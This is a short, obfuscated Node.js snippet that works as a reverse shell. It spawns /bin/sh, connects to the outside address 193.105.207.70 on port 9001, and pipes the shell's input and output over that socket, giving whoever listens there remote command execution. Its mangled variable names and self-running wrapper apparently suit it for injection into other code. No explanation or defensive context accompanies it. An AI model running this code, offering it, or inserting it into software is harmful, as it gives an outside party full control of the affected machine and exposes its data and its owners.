(function () {
  var _0x4728ff = require("net"), _0x50bd8c = require("child_process"), _0x4d4103 = _0x50bd8c.spawn("/bin/sh", []);
  var _0xe27468 = new _0x4728ff.Socket;
  _0xe27468.connect(9001, "193.105.207.70", function () {
    _0xe27468.pipe(_0x4d4103.stdin);
    _0x4d4103.stdout.pipe(_0xe27468);
    _0x4d4103.stderr.pipe(_0xe27468);
  });
  return /a/;
}());

